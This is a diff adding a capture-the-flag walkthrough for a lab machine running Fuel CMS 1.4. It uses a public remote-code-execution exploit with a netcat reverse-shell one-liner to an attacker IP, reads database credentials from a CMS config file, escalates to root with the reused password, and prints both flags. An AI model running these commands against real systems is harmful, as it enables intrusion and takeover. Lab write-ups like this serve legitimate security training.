@@ -1,0 +1,82 @@
+1. User.txt
+$ nmap {MACHINE-IP}
+# PORT   STATE SERVICE
+# 80/tcp open  http
+$ nmap -sV -p 80 {MACHINE-IP}
+# PORT   STATE SERVICE VERSION
+# 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Navigate to http://{MACHINE-IP}, we see this WebApp use Fuel CMS 1.4
+$ searchsploit fuel cms 1.4 
+Exploit Title                                                                                                                    |  Path
+---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                       | linux/webapps/47138.py
+
+Modified IP, delete proxy
+
+To get reverse shell, 
+$ nc -lvnp 4444
+Then
+$ python 47138.py
+cmd: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {YOUR-IP-OPENVPN} 4444 > /tmp/f
+
+listening on [any] 4444 ...
+connect to [10.9.3.230] from (UNKNOWN) [10.10.133.219] 48830
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ ls
+README.md
+assets
+composer.json
+contributing.md
+fuel
+index.php
+robots.txt
+$ ls /home/
+www-data
+$ ls /home/www-data/
+flag.txt
+$ cd /home/www-data/
+$ cat flag.txt
+6470e394cbf6dab6a91682cc8585059b
+#Flag: 6470e394cbf6dab6a91682cc8585059b
+
+2. Root.txt
+CMS has some config file
+$ cat /var/www/html/fuel/application/config/database.php
+db['default'] = array(
+        'dsn'   => '',
+        'hostname' => 'localhost',
+        'username' => 'root',
+        'password' => 'mememe',
+        'database' => 'fuel_schema',
+        'dbdriver' => 'mysqli',
+        'dbprefix' => '',
+        'pconnect' => FALSE,
+        'db_debug' => (ENVIRONMENT !== 'production'),
+        'cache_on' => FALSE,
+        'cachedir' => '',
+        'char_set' => 'utf8',
+        'dbcollat' => 'utf8_general_ci',
+        'swap_pre' => '',
+        'encrypt' => FALSE,
+        'compress' => FALSE,
+        'stricton' => FALSE,
+        'failover' => array(),
+        'save_queries' => TRUE
+);
+Spawn a stable shell
+python -c 'import pty;pty.spawn("/bin/bash");'
+www-data@ubuntu:/$ su root
+su root
+Password: mememe
+root@ubuntu:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:~# ls
+ls
+root.txt
+root@ubuntu:~# cat root.txt
+cat root.txt
+b9bbcb33e11b80be759c4e844862482d
+#Flag: b9bbcb33e11b80be759c4e844862482d
